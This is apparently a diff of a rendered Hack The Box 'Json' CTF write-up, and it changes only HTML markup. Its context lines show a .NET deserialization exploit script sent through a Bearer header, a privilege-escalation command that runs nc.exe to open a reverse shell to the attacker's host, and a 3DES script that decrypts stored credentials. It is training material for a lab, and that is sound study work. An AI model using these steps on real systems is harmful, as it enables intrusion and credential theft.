@@ -1,4 +1,4 @@
-I"�<h1 id="medium-json-">[MEDIUM] Json <br /></h1>
+I"�<h1 id="medium-json-">[MEDIUM] Json <br /></h1>
 
 <p><img src="images/json/json_1.png# icon" alt="Json icon" /></p>
 
@@ -150,7 +150,7 @@ Quick check for “admin”/”admin” username/password to see if it works.</p
 It worked as it opens up a dashboard. However, upon further inspection of the links on the dashboard, most of it are dead. 
 <br /></p>
 
-<p>Checking the page source, we can see there is a javascript file called <code class="highlighter-rouge">app.min.js</code>. Below are also its contents</p>
+<p>Checking the page source, we can see there is a javascript file called <code class="language-plaintext highlighter-rouge">app.min.js</code>. Below are also its contents</p>
 
 <p><img src="images/json/json_7.png# medium" alt="7" /></p>
 
@@ -207,18 +207,18 @@ It worked as it opens up a dashboard. However, upon further inspection of the li
 <p><br />
 There are two links we can see:</p>
 <ul>
-  <li><code class="highlighter-rouge">/api/token</code> at line 15</li>
-  <li><code class="highlighter-rouge">/api/Account</code> at line 26</li>
+  <li><code class="language-plaintext highlighter-rouge">/api/token</code> at line 15</li>
+  <li><code class="language-plaintext highlighter-rouge">/api/Account</code> at line 26</li>
 </ul>
 
 <p><br /></p>
 
-<p>The <code class="highlighter-rouge">/api/token</code> accepts <code class="highlighter-rouge">POST</code> requests with data parameters <code class="highlighter-rouge">UserName</code> and <code class="highlighter-rouge">Password</code> while <code class="highlighter-rouge">/api/Account</code> accepts <code class="highlighter-rouge">GET</code> requests whereas it has additional header called <code class="highlighter-rouge">Bearer</code> (decoded bytecode from line 28).</p>
+<p>The <code class="language-plaintext highlighter-rouge">/api/token</code> accepts <code class="language-plaintext highlighter-rouge">POST</code> requests with data parameters <code class="language-plaintext highlighter-rouge">UserName</code> and <code class="language-plaintext highlighter-rouge">Password</code> while <code class="language-plaintext highlighter-rouge">/api/Account</code> accepts <code class="language-plaintext highlighter-rouge">GET</code> requests whereas it has additional header called <code class="language-plaintext highlighter-rouge">Bearer</code> (decoded bytecode from line 28).</p>
 
 <p><br />
 Accessing those links with curl will give these results:</p>
 <ul>
-  <li>Result at <code class="highlighter-rouge">/api/token</code> curl</li>
+  <li>Result at <code class="language-plaintext highlighter-rouge">/api/token</code> curl</li>
 </ul>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/CTFs/HTB/Json# curl http://10.10.10.158/api/token <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s2">"{'Username' : 'admin', 'Password' : 'admin'}"</span> <span class="nt">-v</span>
@@ -258,7 +258,7 @@ There is nothing really new in there. Even the password hash is also just “adm
 <br /></p>
 
 <ul>
-  <li>Result at <code class="highlighter-rouge">/api/Account</code> curl. Since the <code class="highlighter-rouge">Bearer</code> header is for authentication, we just set its value from the value of the cookie given by <code class="highlighter-rouge">/api/token</code>.</li>
+  <li>Result at <code class="language-plaintext highlighter-rouge">/api/Account</code> curl. Since the <code class="language-plaintext highlighter-rouge">Bearer</code> header is for authentication, we just set its value from the value of the cookie given by <code class="language-plaintext highlighter-rouge">/api/token</code>.</li>
 </ul>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/CTFs/HTB/Json# curl http://10.10.10.158/api/Account <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-v</span> <span class="nt">-H</span> <span class="s2">"Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0="</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span>
@@ -319,7 +319,7 @@ It means that the deserialization of the data is mishandled and can be a vulnera
 <h3 id="targeting--apitoken">Targeting : /api/token</h3>
 
 <p>We setup an icmp sniffer:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -i tun0 icmp
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -i tun0 icmp
 </code></pre></div></div>
 <p>and then we attack. If our payload succeeds, our icmp sniffer should be accepting icmp packets.</p>
 
@@ -355,7 +355,7 @@ And our python exploit - json_exploit.py</p>
 
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload_flex.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">rf</span><span class="p">:</span>
 
-	<span class="n">contents</span> <span class="o">=</span> <span class="n">rf</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+	<span class="n">contents</span> <span class="o">=</span> <span class="n">rf</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
 
 <span class="c1">#token = base64.b64encode(contents).decode()
 #print(tokena)
@@ -363,13 +363,13 @@ And our python exploit - json_exploit.py</p>
 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
 
 	<span class="n">useri</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>
-	<span class="n">useri</span> <span class="o">=</span> <span class="n">useri</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)</span>
+	<span class="n">useri</span> <span class="o">=</span> <span class="n">useri</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)</span>
 
 	<span class="n">to_send</span> <span class="o">=</span> <span class="n">contents</span> <span class="o">%</span> <span class="p">(</span><span class="n">useri</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">useri</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-	<span class="n">to_send</span> <span class="o">=</span> <span class="n">to_send</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>	
+	<span class="n">to_send</span> <span class="o">=</span> <span class="n">to_send</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>	
 
-	<span class="n">token</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">to_send</span><span class="p">)</span>
-	<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+	<span class="n">token</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">to_send</span><span class="p">)</span>
+	<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
 
 	<span class="k">print</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
 
@@ -379,9 +379,9 @@ And our python exploit - json_exploit.py</p>
 		<span class="s">'Bearer'</span> <span class="p">:</span> <span class="n">token</span>
 	<span class="p">}</span>
 
-	<span class="n">page</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.10.10.158/api/Account'</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+	<span class="n">page</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.10.10.158/api/Account'</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">page</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
 
 </code></pre></div></div>
 
@@ -412,7 +412,7 @@ We successfuly spawned a shell with “userpool” as our user!</p>
 <br /></p>
 
 <h2 id="user-flag">User Flag</h2>
-<p>We can just go to <code class="highlighter-rouge">C:\Users\userpool\Desktop\</code> to get our user flag.</p>
+<p>We can just go to <code class="language-plaintext highlighter-rouge">C:\Users\userpool\Desktop\</code> to get our user flag.</p>
 
 <p><img src="images/json/json_19.png# big" alt="19" /></p>
 
@@ -456,7 +456,7 @@ After uploading the executable, set up another netcat in the attacking machine a
 <pre><code class="language-Bash">c:\Windows\Temp&gt;.\service.exe -l 3333 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c c:\Windows\Temp\nc.exe 10.10.14.87 4445 -e cmd.exe"
 </code></pre>
 <p><br />
-After the netcat receives the connection, we are connected as <code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code> on the server. We also should be able to get the root flag.</p>
+After the netcat receives the connection, we are connected as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> on the server. We also should be able to get the root flag.</p>
 
 <p><img src="images/json/json_23.png# big" alt="23" /></p>
 
@@ -497,7 +497,7 @@ After retrieving the two files, it can now be checked that the executable is .NE
 <p>To reverse or decompile the .NET executable, <a href="https://www.jetbrains.com/decompiler/">dotPeek</a> is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.</p>
 
 <p><img src="images/json/json_26.png" alt="26" />
-Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has <code class="highlighter-rouge">useHashing</code> variable that decides whether or not to hash the key.</p>
+Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has <code class="language-plaintext highlighter-rouge">useHashing</code> variable that decides whether or not to hash the key.</p>
 
 <h3 id="decrypting-username-and-password">Decrypting username and password</h3>
 <p>Here’s the written python script to decrypt the username and password.</p>
@@ -507,7 +507,7 @@ Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the e
 
 <span class="n">username</span> <span class="o">=</span> <span class="s">"4as8gqENn26uTs9srvQLyg=="</span>
 <span class="n">password</span> <span class="o">=</span> <span class="s">"oQ5iORgUrswNRsJKH9VaCw=="</span>
-<span class="n">key</span> <span class="o">=</span> <span class="s">"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU</span><span class="si">%</span><span class="s">"</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"</span>
 
 <span class="s">'''
 Notice that key is not lenth 16 or 24, so
@@ -517,17 +517,17 @@ That's what also probably the useHashing
 variable used for.
 '''</span>
 
-<span class="n">hh</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md5'</span><span class="p">)</span>
-<span class="n">hh</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
-<span class="n">hashed_key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hh</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+<span class="n">hh</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md5'</span><span class="p">)</span>
+<span class="n">hh</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+<span class="n">hashed_key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hh</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">())</span>
 
-<span class="n">username</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
-<span class="n">password</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
 
-<span class="n">des3_cipher</span> <span class="o">=</span> <span class="n">DES3</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">hashed_key</span><span class="p">,</span> <span class="n">DES3</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
+<span class="n">des3_cipher</span> <span class="o">=</span> <span class="n">DES3</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">hashed_key</span><span class="p">,</span> <span class="n">DES3</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s">"[+] USER: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">des3_cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">username</span><span class="p">)))</span>
-<span class="k">print</span><span class="p">(</span><span class="s">"[+] PASS: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">des3_cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">password</span><span class="p">)))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] USER: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">des3_cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">username</span><span class="p">)))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] PASS: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">des3_cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">password</span><span class="p">)))</span>
 </code></pre></div></div>
 <p><br />
 And the output of python script is:</p>
